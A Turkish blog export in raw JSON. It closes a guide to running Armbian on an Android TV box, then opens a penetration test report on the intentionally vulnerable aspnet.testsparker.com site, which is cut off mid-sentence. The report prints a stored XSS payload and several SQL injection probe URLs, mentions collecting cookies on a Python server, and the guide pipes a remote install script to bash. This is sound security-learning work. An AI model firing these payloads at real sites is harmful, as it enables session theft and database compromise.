giri\u015f bilgilerini girdi\u011finiz kar\u015f\u0131n\u0131za Armbian\'\u0131n kar\u015f\u0131lama ekran\u0131 \xe7\u0131kacak.\\r\\n\\r\\n![](media/image-3.png)\\r\\n\\r\\nBu a\u015famadan sonra cihaz\u0131n kendi depolama k\u0131sm\u0131na Armbian\'\u0131 kal\u0131c\u0131 olarak y\xfcklemeke isterseniz \\"install-aml.sh\\" ile devam edebilirsiniz fakat ben cihaz\u0131 brick etme ihtimaline kar\u015f\u0131 \u015fimdilik sadece SD kart \xfczerinden \xe7al\u0131\u015ftararak devam edece\u011fim. \xc7\xfcnk\xfc cihaz\u0131 geriye d\xf6nd\xfcrmek i\xe7in sat\u0131c\u0131 firma taraf\u0131ndan mevcut bir da\u011f\u0131t\u0131m\u0131 yok. \\r\\n\\r\\n![](media/image-4.png)\\r\\n\\r\\n## Tekrar Android\'e Ge\xe7mek & Cihaz\u0131 Kapatmak & Yeniden Ba\u015flatmak\\r\\n\\r\\n1. Cihaz\u0131 `(sudo e\u011fer root de\u011filseniz) shutdown -h now` komutuyla kapatt\u0131ktan sonra SD kart\u0131 \xe7\u0131kar\u0131n ve Android olarak kullanmaya devam edebilirsiniz. Tekrar \xe7al\u0131\u015ft\u0131rmak istedi\u011finizde yine Terminal Emulator\'den ayn\u0131 \u015fekilde ba\u015flatabilirsiniz. \\r\\n\\r\\n2. SD kart tak\u0131l\u0131yken cihaz\u0131 kapat\u0131p kumandadan tekrar g\xfc\xe7 tu\u015funa bast\u0131\u011f\u0131mda yine Armbian olarak a\xe7\u0131l\u0131yor.\\r\\n\\r\\n3. Cihaz\u0131 `reboot` komutu ile yeniden ba\u015flatt\u0131\u011f\u0131mda da ayn\u0131 \u015fekilde Armbian olarak \xe7al\u0131\u015fmaya devam ediyor.\\r\\n\\r\\n## SSH ile Ba\u011flanma & \u0130lk Yap\u0131land\u0131rmalar\\r\\n\\r\\nCihaz\u0131 modeme ba\u011flad\u0131ktan sonra \\"ip a\\" komutuyla IP al\u0131p almad\u0131\u011f\u0131n\u0131 kontrol ediyoruz. Genelde \\"eth0\\" ad\u0131ndaki aray\xfcz ile fiziksel ethernet portu \xe7al\u0131\u015f\u0131r. \u0130nternete ba\u011fland\u0131ktan sonra \\"apt update && apt upgrade\\" ile g\xfcncellemeleri yap\u0131yoruz. SSH servisi genelde y\xfckl\xfc ve a\xe7\u0131k gelir. \\"ss -tuln\\" komutuyla a\xe7\u0131k portlar\u0131 listeliyoruz.\\r\\n\\r\\n`tcp LISTEN 0 4096 *:22 *:* `\\r\\n\\r\\ngibi 22 (SSH) portu ile alakal\u0131 bir sat\u0131r \\"LISTEN\\" modunda olmal\u0131. \\r\\n\\r\\n`systemctl status ssh.service` (veya sshd) ile SSH servisinin durumunu kontrol ediyoruz.\\r\\n\\r\\n```\\r\\nroot@aml-s9xx-box:~# systemctl status ssh.service\\r\\n\u25cf ssh.service - OpenBSD Secure Shell server\\r\\n     Loaded: loaded (/usr/lib/systemd/system/ssh.service; enabled; preset: enabled)\\r\\n     Active: active (running) \\r\\n```\\r\\n\u015feklinde g\xf6z\xfckmeli.\\r\\n\\r\\nAyn\u0131 modeme ba\u011fl\u0131 bilgisayar\u0131n\u0131zda Terminal a\xe7arak\\r\\n\\"ssh kullan\u0131c\u0131ad\u0131@IP\\" \u015feklinde ba\u011flant\u0131y\u0131 ba\u015flat\u0131yoruz.\\r\\n\\r\\n`ssh root@192.168.1.10` \\r\\n\\r\\nTek seferlik \xe7\u0131kan soruya yes diyerek devam edin. \\r\\n\\r\\nBu ad\u0131mdan sonra cihaza ekran ba\u011flamadan devam edebiliriz. \\r\\n\\r\\nE\u011fer root kullan\u0131c\u0131 olarak giri\u015f yapt\u0131ysan\u0131z komutlar\u0131n ba\u015f\u0131na `sudo` yazmadan kullanabilirsiniz.\\r\\n\\r\\n\\r\\n### Armbian GPG Anahtar Sorununu \xc7\xf6zme\\r\\n\\r\\n`apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 93D6889F9F0E78D5`\\r\\n\\r\\nile `apt install` veya `update` komutlar\u0131nda hata \xe7\u0131karsa bunu giderebiliriz.\\r\\n\\r\\n### Repository (Depo) G\xfcncelleme\\r\\n\\r\\nCihaz\u0131n internet h\u0131z\u0131n\u0131 ve gecikme s\xfcresini \xf6l\xe7mek i\xe7in Ookla Speedtest kurmak istedim.\\r\\n\\r\\n`curl -s https://packagecloud.io/install/repositories/ookla/speedtest-cli/script.deb.sh | bash`\\r\\n\\r\\nile bir dizine indirdim. Daha sonra apt install speedtest ile y\xfcklemek istedi\u011fimde \\r\\n\\"E: Unable to locate package speedtest\\" hatas\u0131 ald\u0131m.\\r\\n\\r\\nBazen `apt update` ile \xe7\xf6z\xfclse de bu sefer \xe7\xf6z\xfclmedi.\\r\\n\\r\\n\u0130lgili repolar\u0131 \u015fu \u015fekilde de\u011fi\u015ftirdim.\\r\\n\\r\\n`cat /etc/apt/sources.list.d/ookla_speedtest-cli.list`\\r\\n\\r\\n\xc7\u0131kt\u0131 \u015f\xf6yle olmal\u0131:\\r\\n```\\r\\ndeb [signed-by=/etc/apt/keyrings/ookla_speedtest-cli-archive-keyring.gpg] https://packagecloud.io/ookla/speedtest-cli/ubuntu/ noble main\\r\\ndeb-src [signed-by=/etc/apt/keyrings/ookla_speedtest-cli-archive-keyring.gpg] https://packagecloud.io/ookla/speedtest-cli/ubuntu/ noble main\\r\\n```\\r\\n\\r\\n`nano /etc/apt/sources.list.d/ookla_speedtest-cli.list` ile d\xfczenlemek i\xe7in a\xe7\u0131yoruz.\\r\\n\\r\\n```\\r\\ndeb [signed-by=/etc/apt/keyrings/ookla_speedtest-cli-archive-keyring.gpg] https://packagecloud.io/ookla/speedtest-cli/ubuntu/ jammy main\\r\\ndeb-src [signed-by=/etc/apt/keyrings/ookla_speedtest-cli-archive-keyring.gpg] https://packagecloud.io/ookla/speedtest-cli/ubuntu/ jammy main\\r\\n```\\r\\n\\r\\n\\"noble\\" k\u0131s\u0131mlar\u0131n\u0131 \\"jammy\\" olarak de\u011fi\u015ftirip CTRL + X, enter ile kaydediyoruz.\\r\\n\\r\\nDaha sonra tekrar y\xfcklemeyi deneyin.\\r\\n\\r\\n### RAM Kullan\u0131m\u0131 & Swap Alan\u0131n\u0131 Kapatma\\r\\n\\r\\nAnl\u0131k RAM kullan\u0131m\u0131n\u0131 g\xf6rmek i\xe7in `free -h` yazd\u0131m.\\r\\n\\r\\n```\\r\\nroot@aml-s9xx-box:~# free -h\\r\\n               total        used        free      shared  buff/cache   available\\r\\nMem:           917Mi       192Mi       607Mi       3.8Mi       191Mi       725Mi\\r\\nSwap:          458Mi          0B       458Mi\\r\\n```\\r\\n\\r\\nE\u011fer cihazda \xe7ok RAM t\xfcketen bir i\u015flem yapmayacaksan\u0131z SD kart\u0131n sa\u011fl\u0131\u011f\u0131 ve kararl\u0131l\u0131\u011f\u0131 (okuma & yazma h\u0131zlar\u0131) a\xe7\u0131s\u0131ndan daha s\xfcrd\xfcr\xfclebilir olmas\u0131 i\xe7in Swap alan\u0131n\u0131 kapatabilirsiniz.\\r\\n\\r\\nCihazda otomatik olarak a\xe7\u0131k gelen Swap alan\u0131n\u0131 g\xf6r\xfcnt\xfclemek i\xe7in bu komutu yazd\u0131m.\\r\\n```\\r\\nroot@aml-s9xx-box:~# swapon --show\\r\\nNAME       TYPE        SIZE USED PRIO\\r\\n/dev/zram0 partition 458.8M   0B    5\\r\\n```\\r\\n\\r\\nBu ayr\u0131lm\u0131\u015f alan\u0131 kapatmak i\xe7in `swapoff /dev/zram0` yaz\u0131yoruz. \\r\\nDaha sonra tekrar a\xe7mak isterseniz `swapon /dev/zram0` uygulayabilirsiniz.\\r\\n\\r\\nE\u011fer /swapfile dosyas\u0131 hi\xe7 olu\u015fturulmad\u0131ysa veya silindiyse, \xf6nce onu olu\u015fturman\u0131z gerekiyor:\\r\\n1. Uygun boyutta bir dosya olu\u015fturun (\xf6rne\u011fin 1GB i\xe7in)\\r\\nsudo fallocate -l 1G /swapfile\\r\\nVeya dd komutuyla (daha yava\u015f olabilir):\\r\\nsudo dd if=/dev/zero of=/swapfile bs=1M count=1024\\r\\n\\r\\n2. Dosya izinlerini ayarlay\u0131n (g\xfcvenlik i\xe7in)\\r\\nsudo chmod 600 /swapfile\\r\\n\\r\\n3. Dosyay\u0131 swap alan\u0131 olarak bi\xe7imlendirin\\r\\nsudo mkswap /swapfile\\r\\n\\r\\n4. Swap\'\u0131 etkinle\u015ftirin\\r\\n\\r\\n**Bu Swap alan\u0131n\u0131 her a\xe7\u0131l\u0131\u015fta kapatmak i\xe7in bir servis \xe7al\u0131\u015ft\u0131raca\u011f\u0131z ve her a\xe7\u0131l\u0131\u015fta bir kez uygulanacak.**\\r\\n\\r\\n`nano /etc/systemd/system/disable-swap.service` ile bir servis dosyas\u0131 olu\u015fturuyoruz ve i\xe7erisine a\u015fa\u011f\u0131daki servis komutlar\u0131n\u0131 yaz\u0131yoruz.\\r\\n\\r\\n```\\r\\n[Unit]\\r\\nDescription=Disable Swap on boot (Swap alan\u0131n\u0131 a\xe7\u0131l\u0131\u015fta kapat)\\r\\nAfter=multi-user.target\\r\\n\\r\\n[Service]\\r\\nType=oneshot\\r\\nExecStart=/sbin/swapoff /dev/zram0\\r\\nRemainAfterExit=true\\r\\n\\r\\n[Install]\\r\\nWantedBy=multi-user.target\\r\\n```\\r\\n\\r\\nve ard\u0131ndan \u015fu ad\u0131mlar\u0131 uygulad\u0131m.\\r\\n\\r\\n```\\r\\nsystemctl daemon-reload     # Yeni servis dosyas\u0131n\u0131 systemd\'ye tan\u0131t\\r\\nsystemctl enable disable-swap.service # Her a\xe7\u0131l\u0131\u015fta \xe7al\u0131\u015fmas\u0131 i\xe7in etkinle\u015ftir\\r\\nsystemctl start disable-swap.service # Servisi \u015fimdi ba\u015flat (test i\xe7in)\\r\\nsystemctl status disable-swap.service # Durumunu kontrol ettim.\\r\\n```\\r\\n\\r\\nTest etmek i\xe7in `reboot` yazarak yeniden ba\u015flat\u0131n ve `free -h` ile kontrol edin.\\r\\n\\r\\n```\\r\\nfree -h\\r\\n               total        used        free      shared  buff/cache   available\\r\\nMem:           917Mi       214Mi       577Mi       3.9Mi       199Mi       703Mi\\r\\nSwap:             0B          0B          0B\\r\\n```\\r\\n\\r\\nSwap alan\u0131 ba\u015far\u0131yla kapat\u0131ld\u0131.\\r\\n\\r\\n### WLAN Aray\xfczlerini Kapatmak\\r\\n\\r\\nCihazda fazladan enerji t\xfcketebilecek Wlan aray\xfczlerini kapatmak i\xe7in (e\u011fer a\xe7\u0131ksa) `rfkill list` komutuyla kontrol ediyoruz.\\r\\n```\\r\\nroot@aml-s9xx-box:~# rfkill list\\r\\n0: phy0: Wireless LAN\\r\\n        Soft blocked: no\\r\\n        Hard blocked: no\\r\\n1: phy1: Wireless LAN\\r\\n        Soft blocked: no\\r\\n        Hard blocked: no\\r\\n```\\r\\n\\r\\n`rfkill block wifi` komutundan sonra tekrar kontrol et.\\r\\n\\r\\n```\\r\\nroot@aml-s9xx-box:~# rfkill list\\r\\n0: phy0: Wireless LAN\\r\\n        Soft blocked: yes\\r\\n        Hard blocked: no\\r\\n1: phy1: Wireless LAN\\r\\n        Soft blocked: yes\\r\\n        Hard blocked: no\\r\\n```\\r\\n\\r\\nBu sayede yaz\u0131l\u0131msal olarak engelledik.\\r\\n\\r\\n### S\u0131cakl\u0131k ve Kaynak T\xfcketimi Takibi\\r\\n\\r\\n`apt install lm-sensors`\\r\\n\\r\\n`sensors-detect`\\r\\n\\r\\nkomutlar\u0131n\u0131 yazd\u0131ktan sonra sorulara varsay\u0131lan (veya) cevaplar\u0131 vererek t\xfcm donan\u0131mlar\u0131 taramas\u0131n\u0131, uygun kerneli bulmas\u0131n\u0131 sa\u011fl\u0131yoruz.\\r\\n\\r\\n```Some south bridges, CPUs or memory controllers contain embedded sensors.\\r\\nDo you want to scan for them? This is totally safe. (YES/no): yes\\r\\nmodprobe: FATAL: Module cpuid not found in directory /lib/modules/6.12.31-current-meson64\\r\\nFailed to load module cpuid.\\r\\n```\\r\\n\\r\\nhatas\u0131 ald\u0131m ve \\"Yes\\" ile devam ediyorum. \u0130htiyac\u0131m\u0131z olan sadece CPU s\u0131cakl\u0131\u011f\u0131.\\r\\n\\r\\n`sensors` yazarak cihazdaki anl\u0131k sens\xf6rleri ve s\u0131cakl\u0131klar\u0131n\u0131 listeliyoruz.\\r\\n\\r\\n```\\r\\nroot@aml-s9xx-box:~# sensors\\r\\nscpi_sensors-isa-0000\\r\\nAdapter: ISA adapter\\r\\naml_thermal:  +50.0\xb0C\\r\\n```\\r\\nBuradaki de\u011fer CPU\'ya ait.\\r\\n\\r\\n`apt install htop` ile htop (Terminal s\xfcre\xe7 y\xf6neticisi uygulamas\u0131) y\xfckl\xfcyoruz.\\r\\n\\r\\nCihaz\u0131n CPU ve RAM kullan\u0131mlar\u0131n\u0131 ve s\u0131cakl\u0131klar\u0131n\u0131 istedi\u011finiz zaman pratik ve anl\u0131k olarak izlemek i\xe7in iki terminal a\xe7\u0131yoruz. \\r\\n\\r\\nbirinde `htop` di\u011ferinde `watch -n 1 sensors` \xe7al\u0131\u015ft\u0131r\u0131yoruz. Cihaz\u0131n anl\u0131k y\xfck\xfcn\xfc bu terminaller ile takip edebilirsiniz.\\r\\n\\r\\n```\\r\\nEvery 1.0s: sensors   \\r\\nscpi_sensors-isa-0000\\r\\nAdapter: ISA adapter\\r\\naml_thermal:  +50.0\xb0C\\r\\n```\\r\\n\\r\\n> `apt install neofetch` veya git clone ile indirip kurulum yapt\u0131ktan sonra\\r\\n\\r\\n![](media/image-6.png)\\r\\n\\r\\n### Di\u011fer Opsiyonel Yap\u0131land\u0131rmalar\\r\\n\\r\\n- Kullan\u0131c\u0131 ad\u0131, hostname de\u011fi\u015ftirilebilir\\r\\n- Sudo komutu yetkilendirilmesi d\xfczeltilebilir\\r\\n- Fail2Ban kurulumu\\r\\n- SSH portunu de\u011fi\u015ftirme\\r\\n- UFW g\xfcvenlik duvar\u0131 yap\u0131land\u0131rmas\u0131\\r\\n- Root giri\u015fi devre d\u0131\u015f\u0131 b\u0131rakma\\r\\n- CPU frekans \xf6l\xe7eklemesi (`cpufrequtils` veya `cpupower` ile)\\r\\n- Tailscale kurulumu ile uzaktan eri\u015fim\\r\\n\\r\\n## Sonu\xe7 ve Kullan\u0131m Senaryolar\u0131\\r\\n\\r\\nSonu\xe7 olarak d\xfc\u015f\xfck enerji t\xfcketen, stabil bir \u015fekilde kesintisiz \xe7al\u0131\u015fabilecek ve s\u0131n\u0131rl\u0131 kaynaklar\u0131na ra\u011fmen bir\xe7ok servisi \xe7al\u0131\u015ft\u0131rabilece\u011finiz bir sunucu kurmu\u015f olduk. Bu kaynaklar\u0131 g\xf6z \xf6n\xfcnde bulundurarak bu sunucuya kullan\u0131m amac\u0131n\u0131za g\xf6re yap\u0131land\u0131rabilirsiniz.\\r\\n\\r\\n- Pi-hole: A\u011f\u0131n\u0131zdaki reklamlar\u0131 ve izleyicileri engellemek i\xe7in DNS tabanl\u0131 bir engelleyici.\\r\\n- Samba veya NFS Sunucusu: Yerel a\u011f\u0131n\u0131zda dosya payla\u015f\u0131m\u0131 i\xe7in.\\r\\n- Medya Sunucusu: Plex, Emby, Jellyfin gibi yaz\u0131l\u0131mlarla kendi medya sunucunuzu kurabilirsiniz (TX3 Mini\'nin performans\u0131 video transcoding i\xe7in s\u0131n\u0131rl\u0131 olabilir, direct play daha uygun).\\r\\n- Nextcloud/OwnCloud: Kendi ki\u015fisel bulut depolama ve senkronizasyon \xe7\xf6z\xfcm\xfc.\\r\\n- Vaultwarden: Bitwarden\'\u0131n daha hafif bir Rust implementasyonudur. Kendi \u015fifre y\xf6neticinizi bar\u0131nd\u0131rmak i\xe7in.\\r\\n- Home Assistant: Ak\u0131ll\u0131 ev otomasyonu i\xe7in.\\r\\n- Docker Kurulumu: Bir\xe7ok servisi izole konteynerlarda \xe7al\u0131\u015ft\u0131rmak i\xe7in \xe7ok kullan\u0131\u015fl\u0131d\u0131r. \\r\\n- Home Server: YunoHost, CasaOS gibi, genel kullan\u0131m ama\xe7l\u0131 veya ufak projelerinizi \xe7al\u0131\u015ft\u0131rmak ve denemek i\xe7in kullan\u0131labilir.\\r\\n\\r\\n## Yararland\u0131\u011f\u0131m Di\u011fer Kaynaklar\\r\\n\\r\\n- https://github.com/armbian/build\\r\\n- https://www.armbian.com/orange-pi-zero-3/\\r\\n- https://github.com/warpme/minimyth2/tree/master/script/bootloaders\\r\\n- https://forum.armbian.com/topic/16976-status-of-armbian-on-tv-boxes-please-read-first\\r\\n- https://i12bretro.github.io/tutorials/0316.html\\r\\n- https://forum.armbian.com/topic/33676-installation-instructions-for-tv-boxes-with-amlogic-cpus\\r\\n- https://forum.armbian.com/topic/49508-install-bookworm-6663-on-x96q-pro-h728/"},{"id":"testsparker-sizma-testi-aspnet","metadata":{"permalink":"/b-log/blog/testsparker-sizma-testi-aspnet","editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2025-05-10/2025-05-10-testsparker-sizma-testi-aspnet.md","source":"@site/blog/2025-05-10/2025-05-10-testsparker-sizma-testi-aspnet.md","title":"Testsparker ASP.NET S\u0131zma Testi & Zaafiyet Analizi Raporu","description":"\xd6zet","date":"2025-05-10T00:00:00.000Z","tags":[{"inline":false,"label":"Siber G\xfcvenlik","permalink":"/b-log/blog/tags/siberguvenlik","description":"G\xfcvenlik a\xe7\u0131klar\u0131, s\u0131zma testleri ve savunma teknikleri"}],"readingTime":11.535,"hasTruncateMarker":true,"authors":[{"name":"Berk Ali Er\xe7elik","title":"Cyber Security & Full Stack Web Dev","url":"https://github.com/berkercelik","page":{"permalink":"/b-log/blog/authors/berkercelik"},"socials":{"github":"https://github.com/berkercelik","linkedin":"https://www.linkedin.com/in/berkaliercelik/"},"imageURL":"https://avatars.githubusercontent.com/u/72663666?v=4","key":"berkercelik"}],"frontMatter":{"slug":"testsparker-sizma-testi-aspnet","title":"Testsparker ASP.NET S\u0131zma Testi & Zaafiyet Analizi Raporu","authors":["berkercelik"],"tags":["siberguvenlik"]},"unlisted":false,"prevItem":{"title":"Android Box\'a Armbian Linux \u0130\u015fletim Sistemi Y\xfcklemek","permalink":"/b-log/blog/android-box-armbian-kurulumu"},"nextItem":{"title":"Wazuh ile SIEM Ortam\u0131 Haz\u0131rlama","permalink":"/b-log/blog/wazuh-ile-siem-ortami"}},"content":"## \xd6zet\\n\\nBu s\u0131zma testi, http://aspnet.testsparker.com/ adresinde bar\u0131nd\u0131r\u0131lan web uygulamas\u0131n\u0131n g\xfcvenlik durumunu de\u011ferlendirmek amac\u0131yla ger\xe7ekle\u015ftirilmi\u015ftir. Test sonucunda, Stored Cross-Site Scripting (XSS), Error-Based SQL Injection, hassas bilgi if\u015fas\u0131 ve veri taban\u0131 dosyas\u0131 if\u015fas\u0131 gibi kritik g\xfcvenlik a\xe7\u0131klar\u0131 tespit edilmi\u015ftir. Bu rapor, bulgular\u0131n detayl\u0131 analizini, olas\u0131 etkilerini ve bu riskleri azaltmak i\xe7in al\u0131nabilecek \xf6nlemleri sunmay\u0131 ama\xe7lamaktad\u0131r. \x3c!-- truncate --\x3e\\n\\nTest, OWASP rehberleri ve manuel test teknikleri dahil olmak \xfczere manuel ara\xe7lar ve metodolojiler kullan\u0131larak ger\xe7ekle\u015ftirilmi\u015ftir. Rapor, teknik ve y\xf6netimsel kitlelere hitap edecek \u015fekilde yap\u0131land\u0131r\u0131lm\u0131\u015f olup, g\xfcvenlik a\xe7\u0131klar\u0131 ciddiyet derecelerine g\xf6re \xf6nceliklendirilmi\u015ftir.\\n\\n**\ud83d\udee1\ufe0fBu s\u0131zma testi s\u0131ras\u0131nda zaman ve kapsam s\u0131n\u0131rlamalar\u0131 nedeniyle derinlemesine analiz yapamasam da, sistemdeki potansiyel giri\u015f noktalar\u0131n\u0131 ba\u015far\u0131yla tespit ettim ve olas\u0131 sald\u0131r\u0131 y\xfczeylerine dair genel bir fark\u0131ndal\u0131k kazand\u0131m.**\\n\\n---\\n\\n## 1. Giri\u015f ve Ama\xe7lar\\n\\n### 1.1 Ama\xe7\\n\\nBu s\u0131zma testinin amac\u0131, `http://aspnet.testsparker.com/` adresinde bar\u0131nd\u0131r\u0131lan web uygulamas\u0131nda g\xfcvenlik a\xe7\u0131klar\u0131n\u0131 tespit etmek ve sistemin gizlilik, b\xfct\xfcnl\xfck ve eri\u015filebilirlik a\xe7\u0131s\u0131ndan olas\u0131 risklerini de\u011ferlendirmektir. Test, genel g\xfcvenlik durumunu iyile\u015ftirmek i\xe7in yap\u0131lm\u0131\u015ft\u0131r.\\n\\n### 1.2 Kapsam\\n\\n- **Hedef Sistem**: `http://aspnet.testsparker.com/` adresindeki web uygulamas\u0131 (IP: 54.204.37.212)\\n- **Test T\xfcrleri**: Harici a\u011f taramas\u0131, web uygulamas\u0131 testi ve g\xfcvenlik a\xe7\u0131\u011f\u0131 de\u011ferlendirmesi\\n- **Hari\xe7 Tutulanlar**: Dahili a\u011f testi veya fiziksel g\xfcvenlik de\u011ferlendirmeleri yap\u0131lmam\u0131\u015ft\u0131r\\n\\n### 1.3 Metodoloji\\n\\nTest s\xfcreci, OWASP Test Rehberine uygun olarak y\xfcr\xfct\xfclm\xfc\u015f, otomatik ara\xe7lar ve manuel teknikler kullan\u0131lm\u0131\u015ft\u0131r:\\n\\n- **Ke\u015fif**: WHOIS sorgusu, DNS numaraland\u0131rmas\u0131 ve servis ke\u015ffi\\n- **Tarama**: Nmap ile a\u011f taramas\u0131, Gobuster ve Ffuf ile dizin numaraland\u0131rmas\u0131\\n- **G\xfcvenlik A\xe7\u0131\u011f\u0131 De\u011ferlendirmesi**: Web uygulamas\u0131 g\xfcvenlik a\xe7\u0131klar\u0131 i\xe7in manuel testler (Burpsuite, Python)\\n- **\u0130stismar**: Tespit edilen g\xfcvenlik a\xe7\u0131klar\u0131n\u0131n do\u011frulanmas\u0131 \\n\\n---\\n\\n## 2. Test Kapsam\u0131 ve Y\xf6ntemleri\\n\\n### 2.1 Test Edilen Sistemler\\n\\n- **Alan Ad\u0131**: `aspnet.testsparker.com`\\n- **IP Adresi**: 54.204.37.212\\n- **Web Uygulamas\u0131**: Microsoft HTTPAPI httpd 2.0 \xfczerinde bar\u0131nd\u0131r\u0131lan ASP.NET tabanl\u0131 uygulama (IIS 8.5)\\n\\n### 2.2 Kullan\u0131lan Ara\xe7lar ve Teknikler\\n\\n- **Nmap**: Port tarama ve hizmet numaraland\u0131rmas\u0131\\n- **Gobuster**: Dizin ve dosya numaraland\u0131rmas\u0131\\n- **Ffuf**: Dizin ve dosya numaraland\u0131rmas\u0131\\n- **Strings**: Veritaban\u0131 dosyas\u0131 i\xe7eri\u011fi analizi\\n- **Python HTTP Sunucusu**: Cookie \xe7alma denemeleri i\xe7in veri toplama\\n- **Manuel Testler**: XSS, SQL Injection, hassas dosya if\u015fas\u0131, Viewstate analizi ve hata mesaj\u0131 analizi\\n- **Burp Suite**: Manuel web uygulamas\u0131 testi i\xe7in kullan\u0131ld\u0131.\\n\\n### 2.3 Test T\xfcrleri\\n\\n- A\xe7\u0131k portlar\u0131n ve hizmetlerin belirlenmesi i\xe7in a\u011f taramas\u0131\\n- XSS, SQL Injection, yanl\u0131\u015f yap\u0131land\u0131rmalar ve hassas veri if\u015fas\u0131 i\xe7in web uygulamas\u0131 testi\\n- Korunmas\u0131z kaynaklar\u0131 tespit etmek i\xe7in dizin ve dosya numaraland\u0131rmas\u0131\\n\\n---\\n\\n## 3. Bulgular ve G\xfcvenlik A\xe7\u0131klar\u0131\\n\\nTest s\u0131ras\u0131nda tespit edilen g\xfcvenlik a\xe7\u0131klar\u0131 a\u015fa\u011f\u0131da listelenmi\u015ftir. Her bir bulgu, a\xe7\u0131klama, etki ve kan\u0131tlarla birlikte sunulmu\u015ftur.\\n\\n### 3.1 SSL/TLS Eksikli\u011fi (Kritik)\\n\\n- **A\xe7\u0131klama**: Web uygulamas\u0131, SSL/TLS \u015fifrelemesi olmadan HTTP \xfczerinden sunulmakta, istemci ve sunucu aras\u0131nda iletilen t\xfcm veriler interception riskine a\xe7\u0131kt\u0131r.\\n- **Etkilenen Bile\u015fen**: T\xfcm web uygulamas\u0131 (`http://aspnet.testsparker.com/`)\\n- **Etki**: Sald\u0131rganlar, oturum a\xe7ma kimlik bilgileri veya ki\u015fisel bilgiler gibi hassas verileri ele ge\xe7irmek i\xe7in man-in-the-middle (MITM) sald\u0131r\u0131lar\u0131 ger\xe7ekle\u015ftirebilir.\\n- **\xd6rnek CVSS Puan\u0131**: 7.5 (Y\xfcksek) AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\\n- **Kan\u0131t**: Uygulama, HTTPS y\xf6nlendirmesi olmadan `http://aspnet.testsparker.com/` \xfczerinden eri\u015filebilir.\\n\\n### 3.2 Stored Cross-Site Scripting (XSS) in Guestbook (Kritik)\\n\\n- **A\xe7\u0131klama**: `/guestbook.aspx` sayfas\u0131, yetersiz giri\u015f denetlemesi nedeniyle stored XSS zafiyetine sahiptir. `<svg><script>confirm(1)<\/script></svg>` payload\u2019u, sayfa render edildi\u011finde JavaScript \xe7al\u0131\u015ft\u0131r\u0131r.\\n- **Etkilenen Bile\u015fen**: `http://aspnet.testsparker.com/guestbook.aspx`\\n- **Etki**: Sald\u0131rganlar, kullan\u0131c\u0131 oturumlar\u0131n\u0131 \xe7alabilir, web sitesini tahrif edebilir veya kullan\u0131c\u0131lar\u0131 k\xf6t\xfc ama\xe7l\u0131 sitelere y\xf6nlendirebilir. Stored XSS, sayfay\u0131 ziyaret eden t\xfcm kullan\u0131c\u0131lar\u0131 etkiler.\\n- **\xd6rnek CVSS Puan\u0131**: 8.8 (Y\xfcksek) CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H\\n- **Kan\u0131t**: Guestbook\u2019a `<svg><script>confirm(1)<\/script></svg>` payload\u2019unun g\xf6nderilmesi, JavaScript uyar\u0131s\u0131n\u0131 tetikler.\\n\\n### 3.3 Error-Based SQL Injection in Products Page (Kritik)\\n\\n- **A\xe7\u0131klama**: `http://aspnet.testsparker.com/Products.aspx?pId=2` adresinde, `pId` parametresi \xfczerinde yap\u0131lan SQL Injection denemeleri, hata tabanl\u0131 SQL Injection a\xe7\u0131\u011f\u0131n\u0131 ortaya \xe7\u0131karm\u0131\u015ft\u0131r. Hatalar, veritaban\u0131 yap\u0131s\u0131 ve veri t\xfcrleri hakk\u0131nda bilgi s\u0131zd\u0131rmaktad\u0131r.\\nAyr\u0131ca ayn\u0131 sayfada bulunan yorum sat\u0131r\u0131 olarak gizlenmi\u015f buton POST olarak istek g\xf6ndermektedir. \\n- **Etkilenen Bile\u015fen**: `http://aspnet.testsparker.com/Products.aspx`\\n- **Etki**: Sald\u0131rganlar, veritaban\u0131ndan hassas verileri (\xf6r. kullan\u0131c\u0131 bilgileri, \xfcr\xfcn verileri) \xe7\u0131karabilir, veritaban\u0131 yap\u0131s\u0131n\u0131 manip\xfcle edebilir veya yetkisiz eri\u015fim elde edebilir.\\n- **\xd6rnek CVSS Puan\u0131**: 9.1 (Kritik) \\\\[CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N\\\\]\\n- **Kan\u0131t**: A\u015fa\u011f\u0131daki denemeler ve hata mesajlar\u0131:\\n  - `http://aspnet.testsparker.com/Products.aspx?pId=asd`\\n    - **Hata**: `Invalid column name \'asd\'.`\\n  - `http://aspnet.testsparker.com/Products.aspx?pId=user`\\n    - **Hata**: `Conversion failed when converting the nvarchar value \'dbo\' to data type int.`\\n  - `http://aspnet.testsparker.com/Products.aspx?pId=2\' OR 1=1--`\\n    - **Hata**: `Incorrect syntax near \'1\'.`\\n  - `http://aspnet.testsparker.com/Products.aspx?pId=4\'+convert(int,(SELECT @@version))--`\\n    - **Hata**: `Incorrect syntax near the keyword \'convert\'. Incorrect syntax near \')\'.`\\n  - Ek olarak sayfan\u0131n kaynak kodunda bulunan yorum sat\u0131r\u0131:\\n  Aktif edildi\u011finde buton ile POST iste\u011fi g\xf6nderiliyor.\\n  \\n  ![ISS85](media/3.png)\\n\\n\\n### 3.4 Hassas Bilgi \u0130f\u015fas\u0131 - Yap\u0131land\u0131rma Dosyas\u0131 (Y\xfcksek)\\n\\n- **A\xe7\u0131klama**: `http://aspnet.testsparker.com/statics/help-yes.html` dosyas\u0131, MAPI ayarlar\u0131 (`MAPI=1`, `CMCDLLNAME32=mapi32.dll`, vb.) gibi e-posta yap\u0131land\u0131rma ayr\u0131nt\u0131lar\u0131n\u0131 if\u015fa etmektedir.\\n\\n- **Etkilenen Bile\u015fen**: `http://aspnet.testsparker.com/statics/help-yes.html`\\n\\n- **Etki**: Sald\u0131rganlar, bu bilgileri e-posta ile ilgili hizmetleri hedeflemek veya yanl\u0131\u015f yap\u0131land\u0131r\u0131lm\u0131\u015f e-posta istemcilerini istismar etmek i\xe7in kullanabilir.\\n\\n- **Kan\u0131t**: Dosya herkese a\xe7\u0131k olarak eri\u015filebilir ve \u015fu i\xe7eri\u011fi i\xe7erir:\\n\\n  ```\\n  ; for 16-bit app support [fonts] [extensions] [mci extensions] [files] [Mail] MAPI=1 CMCDLLNAME32=mapi32.dll CMC=1 MAPIX=1 MAPIXVER=1.0.0.1 OLEMessaging=1 [ResponseResult] ResultCode=0\\n  ```\\n\\n### 3.5 Korunmas\u0131z Dizin (`/statics/`) (Orta)\\n\\n- **A\xe7\u0131klama**: `/statics/` dizini herkese a\xe7\u0131k 